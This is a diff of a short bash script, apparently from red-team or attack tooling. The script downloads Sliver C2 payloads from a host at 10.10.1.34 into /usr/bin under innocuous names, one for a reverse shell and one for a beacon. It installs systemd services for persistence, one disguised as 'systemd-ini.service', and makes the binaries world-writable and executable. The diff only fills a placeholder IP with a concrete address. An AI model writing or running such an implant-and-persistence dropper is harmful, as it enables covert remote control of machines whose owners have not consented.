@@ -1,12 +1,12 @@
 #!/bin/bash
 
 #Rev shell
-wget IP/Beachhead_source/sliverPayLOADS/BEAUTIFUL_APPLAUSE -O /usr/bin/start
-wget IP/Services/worker.service -O /etc/systemd/system/worker.service
+wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/start
+wget 10.10.1.34/Services/worker.service -O /etc/systemd/system/worker.service
 
 #Beacon
-wget IP/Beachhead_source/sliverPayLOADS/BEAUTIFUL_APPLAUSE -O /usr/bin/sys
-wget IP/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.service
+wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/sys
+wget 10.10.1.34/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.service
 
 chmod 777 /usr/bin/start
 chmod 777 /usr/bin/sys
